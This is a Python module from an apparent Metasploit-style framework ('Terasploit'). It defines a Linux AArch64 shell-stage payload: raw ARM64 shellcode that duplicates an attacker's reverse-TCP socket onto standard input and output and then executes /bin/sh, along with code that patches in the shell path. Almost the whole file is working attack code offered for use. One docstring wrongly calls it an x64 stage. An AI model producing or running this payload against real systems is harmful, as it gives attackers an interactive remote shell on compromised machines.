import struct
from collections.abc import Mapping, Sequence

from teralibs.tsf.base.payload import ARCH_AARCH64, PLATFORM_LINUX, STAGE, Payload


# Terasploit module


class TerasploitModule(Payload):
    """Linux AArch64 interactive /bin/sh stage."""

    NAME: str = "Linux AArch64 Shell Stage"
    DESCRIPTION: str = (
        "Linux AArch64 (ARM64) stage that receives control from the reverse-TCP "
        "stager and executes /bin/sh, giving the attacker an interactive shell "
        "over the established socket connection."
    )
    AUTHOR: Sequence = ["4steroth"]
    LICENSE: str = "BSD-3-CLAUSE"
    VERSION: str = "1.0"
    RANK: str = "normal"
    REFERENCES: Sequence = [
        "https://github.com/rapid7/metasploit-framework/blob/master/modules/payloads/stages/linux/aarch64/shell.rb",
    ]
    PAYLOAD_TYPE: str = STAGE
    CACHED_SIZE: int = 92
    MAX_SIZE: int | None = 256
    ARCH: Sequence = [ARCH_AARCH64]
    PLATFORM: Sequence = [PLATFORM_LINUX]
    STAGE_BLOB: Mapping = {
        "PAYLOAD": [
            # Ported from metasploit framework.
            0xAA0C03E0,  #  mov	x0, x12
            0xD2800002,  #  mov	x2, #0x0                   	// #0
            0xD2800001,  #  mov	x1, #0x0                   	// #0
            0xD2800308,  #  mov	x8, #0x18                  	// #24
            0xD4000001,  #  svc	#0x0
            0xD2800021,  #  mov	x1, #0x1                   	// #1
            0xD2800308,  #  mov	x8, #0x18                  	// #24
            0xD4000001,  #  svc	#0x0
            0xD2800041,  #  mov	x1, #0x2                   	// #2
            0xD2800308,  #  mov	x8, #0x18                  	// #24
            0xD4000001,  #  svc	#0x0
            0x10000140,  #  adr	x0, 54 <shell>
            0xD2800002,  #  mov	x2, #0x0                   	// #0
            0xF90003E0,  #  str	x0, [sp]
            0xF90007E2,  #  str	x2, [sp,#8]
            0x910003E1,  #  mov	x1, sp
            0xD2801BA8,  #  mov	x8, #0xdd                  	// #221
            0xD4000001,  #  svc	#0x0
            0xD2800000,  #  mov	x0, #0x0                   	// #0
            0xD2800BA8,  #  mov	x8, #0x5d                  	// #93
            0xD4000001,  #  svc	#0x0
            0x00000000,  #  .word	0x00000000              // shell
            0x00000000,  #  .word	0x00000000
            0x00000000,  #  .word	0x00000000
            0x00000000,  #  .word	0x00000000
        ]
    }

    def __init__(self):
        self.register_options(
            [
                self.opt(
                    "SHELL",
                    "/bin/sh",
                    True,
                    "The shell to execute",
                    self.otype.PATH,
                )
            ]
        )

    def generate(self, ctx):
        """Generate method is not really implemented in stage payloads."""
        return b""

    def generate_stage(self, ctx):
        """
        Return the Linux x64 shell stage bytes.
        """

        raw_shell = self.DATASTORE.get("SHELL") or "/bin/sh"
        shell = raw_shell.encode(encoding="utf-8")

        # Validate the length (must be less than 16 bytes)
        if len(shell) >= 16:
            raise ValueError("The specified shell must be less than 16 bytes.")

        payload = bytearray(struct.pack(f"<{len(self.STAGE_BLOB['PAYLOAD'])}I", *self.STAGE_BLOB["PAYLOAD"]))

        # 3. In-place byte ingestion (equivalent to p[84, sh.length] = sh)
        # This overwrites the null padding at offset 84 with the string bytes
        start_offset = 84
        end_offset = start_offset + len(shell)
        payload[start_offset:end_offset] = shell

        return bytes(payload)
